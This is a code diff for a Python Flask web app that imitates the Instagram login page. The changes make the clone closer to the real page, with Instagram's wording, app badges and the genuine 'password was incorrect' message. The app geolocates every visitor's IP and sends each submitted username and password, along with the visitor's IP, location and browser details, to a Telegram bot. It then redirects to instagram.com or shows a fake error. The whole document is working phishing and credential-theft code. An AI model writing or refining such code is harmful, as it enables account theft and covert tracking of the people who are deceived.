@@ -13,13 +13,11 @@ ADMIN_CHAT_ID = '6420116837'
 VALID_USERNAME = "admin"
 VALID_PASSWORD = "admin123"
 
-# Function to get user details (simplified version without ip2geotools)
 def get_user_details(ip):
     try:
-        if ip == '127.0.0.1':
+        if ip in ['127.0.0.1', 'localhost']:
             ip = requests.get('https://api.ipify.org').text
         
-        # Using free IP API instead of ip2geotools
         response = requests.get(f'http://ip-api.com/json/{ip}').json()
         return {
             'ip': ip,
@@ -37,7 +35,6 @@ def get_user_details(ip):
             'coordinates': 'Unknown'
         }
 
-# Function to send message to Telegram (simplified version without telebot)
 def send_telegram_message(message):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -50,112 +47,202 @@ def send_telegram_message(message):
     except Exception as e:
         print(f"Error sending Telegram message: {e}")
 
-# HTML + CSS Template (same as before)
+# Exact Instagram login page clone
 login_page = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Instagram Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
     <style>
         body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background-color: #fafafa;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
         }
-
-        .login-container {
-            background-color: white;
-            border: 1px solid #dbdbdb;
-            padding: 40px 40px;
-            width: 350px;
-            text-align: center;
-        }
-
-        .login-container h1 {
-            font-family: 'Billabong', cursive;
-            font-size: 48px;
-            margin-bottom: 30px;
-        }
-
-        input[type="text"],
-        input[type="password"] {
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 350px;
             width: 100%;
-            padding: 10px;
-            margin: 6px 0;
+        }
+        
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 40px;
+            margin-bottom: 10px;
+            width: 100%;
             box-sizing: border-box;
+        }
+        
+        .logo {
+            margin: 22px auto 12px;
+            width: 175px;
+        }
+        
+        form {
+            margin-top: 24px;
+        }
+        
+        input {
+            background: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            background: #fafafa;
-        }
-
-        button {
+            color: #262626;
+            font-size: 14px;
+            padding: 9px 8px 7px;
+            margin-bottom: 6px;
             width: 100%;
-            background-color: #3897f0;
-            color: white;
-            padding: 10px;
+            box-sizing: border-box;
+        }
+        
+        button {
+            background-color: #0095f6;
             border: none;
-            margin-top: 10px;
-            border-radius: 5px;
-            font-weight: bold;
+            border-radius: 4px;
+            color: white;
+            font-weight: 600;
+            padding: 5px 9px;
+            width: 100%;
+            height: 32px;
+            margin-top: 8px;
             cursor: pointer;
         }
-
-        .or {
-            margin: 20px 0;
-            color: #999;
-            font-weight: bold;
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0 18px;
         }
-
-        .forgot {
+        
+        .line {
+            background-color: #dbdbdb;
+            height: 1px;
+            flex-grow: 1;
+        }
+        
+        .or {
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 0 18px;
+            text-transform: uppercase;
+        }
+        
+        .facebook-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            margin: 8px 0;
+            text-align: center;
+            text-decoration: none;
+        }
+        
+        .forgot-password {
             color: #00376b;
             font-size: 12px;
+            line-height: 14px;
+            margin-top: 12px;
+            text-align: center;
             text-decoration: none;
         }
-
-        .signup {
-            margin-top: 20px;
+        
+        .signup-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            margin: 0 0 10px;
+            text-align: center;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        
+        .signup-text {
+            color: #262626;
             font-size: 14px;
+            margin: 15px;
         }
-
-        .signup a {
-            color: #3897f0;
-            font-weight: bold;
+        
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
             text-decoration: none;
         }
-
+        
         .flash {
-            color: red;
+            color: #ed4956;
             font-size: 14px;
-            margin-bottom: 10px;
+            line-height: 18px;
+            margin: 10px 0;
+            text-align: center;
+        }
+        
+        .app-download {
+            text-align: center;
+            width: 100%;
+        }
+        
+        .app-stores {
+            margin-top: 20px;
+        }
+        
+        .app-store {
+            height: 40px;
+            margin: 0 4px;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h1>Instagram</h1>
-
-        {% with messages = get_flashed_messages() %}
-          {% if messages %}
-            <div class="flash">{{ messages[0] }}</div>
-          {% endif %}
-        {% endwith %}
-
-        <form method="POST" action="/">
-            <input type="text" name="username" placeholder="Username" required><br>
-            <input type="password" name="password" placeholder="Password" required><br>
-            <button type="submit">Log In</button>
-        </form>
-
-        <div class="or">OR</div>
-
-        <a class="forgot" href="#">Forgot password?</a>
-
-        <div class="signup">
-            Don't have an account? <a href="#">Sign up</a>
+    <div class="container">
+        <div class="login-box">
+            <h1 class="logo" style="font-family: 'Billabong', cursive; font-size: 48px; text-align: center; margin: 0 auto 24px;">Instagram</h1>
+            
+            {% with messages = get_flashed_messages() %}
+              {% if messages %}
+                <div class="flash">{{ messages[0] }}</div>
+              {% endif %}
+            {% endwith %}
+            
+            <form method="POST" action="/">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            
+            <div class="divider">
+                <div class="line"></div>
+                <div class="or">or</div>
+                <div class="line"></div>
+            </div>
+            
+            <a href="#" class="facebook-login">
+                <i class="fab fa-facebook-square"></i> Log in with Facebook
+            </a>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+        
+        <div class="signup-box">
+            <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+        </div>
+        
+        <div class="app-download">
+            <p>Get the app.</p>
+            <div class="app-stores">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store" class="app-store">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play" class="app-store">
+            </div>
         </div>
     </div>
 </body>
@@ -166,7 +253,7 @@ login_page = """
 def login():
     # Get user IP and details
     user_ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent')
+    user_agent = request.headers.get('User-Agent', 'Unknown')
     referrer = request.headers.get('Referer', 'Direct access')
     
     # Get location details
@@ -186,8 +273,8 @@ def login():
     send_telegram_message(access_message)
 
     if request.method == "POST":
-        username = request.form.get("username")
-        password = request.form.get("password")
+        username = request.form.get("username", "")
+        password = request.form.get("password", "")
 
         # Send login attempt to Telegram
         login_message = f"""
@@ -205,9 +292,9 @@ def login():
         send_telegram_message(login_message)
 
         if username == VALID_USERNAME and password == VALID_PASSWORD:
-            return f"<h2 style='text-align:center;'>Welcome, {username} 🎉</h2>"
+            return "<script>window.location.href = 'https://instagram.com';</script>"
         else:
-            flash("Invalid username or password")
+            flash("Sorry, your password was incorrect. Please double-check your password.")
 
     return render_template_string(login_page)
 
